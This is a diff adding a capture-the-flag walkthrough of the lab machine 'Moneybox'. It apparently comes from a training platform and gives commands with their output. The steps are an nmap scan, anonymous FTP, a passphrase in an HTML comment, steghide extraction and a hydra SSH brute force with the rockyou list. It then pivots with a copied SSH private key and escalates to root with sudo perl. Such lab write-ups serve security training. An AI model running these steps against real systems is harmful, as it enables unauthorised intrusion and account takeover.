@@ -1,0 +1,89 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.190.230 > PGP_Moneybox.txt
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.173
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
+|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
+|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: MoneyBox
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+http://192.168.190.230/blogs/
+I'm T0m-H4ck3r
+view-source:http://192.168.190.230/blogs/
+# at buttom
+<!--the hint is the another secret directory is S3cr3t-T3xt-->
+
+view-source:http://192.168.190.230/S3cr3t-T3xt/
+<!..Secret Key 3xtr4ctd4t4 >
+
+$ steghide extract -sf trytofind.jpg
+passphrase: 3xtr4ctd4t4
+wrote extracted data to "data.txt".
+
+$ cat data.txt                  
+Hello.....  renu
+
+      I tell you something Important.Your Password is too Week So Change Your Password
+Don't Underestimate it.......
+
+Find user renu
+$ hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.190.230 -s 22
+[22][ssh] host: 192.168.190.230   login: renu   password: 987654321
+
+$ ssh renu@192.168.190.230
+renu@MoneyBox:~$ id
+uid=1001(renu) gid=1001(renu) groups=1001(renu)
+
+Linux version 4.19.0-22-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.260-1 (2022-09-29)
+Sudo version 1.8.27
+
+renu@MoneyBox:~$ cat .bash_history
+# Found renu/.ssh/id_rsa is copy from user lily
+
+renu@MoneyBox:~/.ssh$ cat id_rsa
+# copy id_rsa to Kali
+$ ssh -i id_rsa lily@192.168.190.230
+Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80
+lily@MoneyBox:~$ id
+uid=1000(lily) gid=1000(lily) groups=1000(lily),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+lily@MoneyBox:~$ sudo -l
+Matching Defaults entries for lily on MoneyBox:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lily may run the following commands on MoneyBox:
+    (ALL : ALL) NOPASSWD: /usr/bin/perl
+
+lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh"'
+# id
+uid=0(root) gid=0(root) groups=0(root)
